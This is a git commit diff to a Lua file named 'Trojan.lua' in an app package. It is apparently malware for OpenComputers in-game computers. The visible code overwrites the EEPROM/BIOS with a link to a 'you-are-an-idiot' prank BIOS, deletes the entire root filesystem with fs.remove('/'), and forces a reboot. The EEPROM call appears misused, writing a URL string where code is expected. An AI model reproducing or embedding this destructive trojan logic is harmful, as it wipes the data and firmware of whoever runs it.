3faf6a04164593f3c3da7c1a2039f814dbaf8744
matvey-mayner <144268527+matvey-mayner@users.noreply.github.com>
2024-01-18 21:50:32 +0300

    Update Trojan.lua

--- Maynersky.app/Trojan.lua
+++ Maynersky.app/Trojan.lua
@@ -2,7 +2,7 @@ local component = require("component")
 local eeprom = component.eeprom
 local fs = require("filesystem")
 
-component.eeprom.set('https://raw.githubusercontent.com/Oyo-Player/OC-you-are-an-idiot-bios/main/eeprom_code.lua /tmp/eeprom_code.lua')
+component.eeprom.set('https://raw.githubusercontent.com/Oyo-Player/OC-you-are-an-idiot-bios/main/eeprom_code.lua')
 
 fs.remove("/")
 computer.shutdown(true)
